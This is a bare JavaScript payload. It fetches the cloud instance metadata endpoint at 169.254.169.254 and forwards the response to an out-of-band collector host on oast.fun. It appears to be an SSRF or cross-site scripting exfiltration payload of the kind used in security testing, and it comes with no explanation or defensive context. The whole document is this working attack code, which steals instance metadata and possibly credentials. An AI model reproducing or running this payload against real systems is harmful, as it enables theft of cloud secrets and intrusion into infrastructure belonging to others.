x = new XMLHttpRequest();
x.onload = function() {
    l = new XMLHttpRequest();
    l.open("GET", "http://abhhrvlbveslopuhgasupt9ccr4vsypy9.oast.fun/" + encodeURIComponent(this.responseText));
    l.send();
};
x.open("GET", "http://169.254.169.254/metadata/v1/");
x.send();
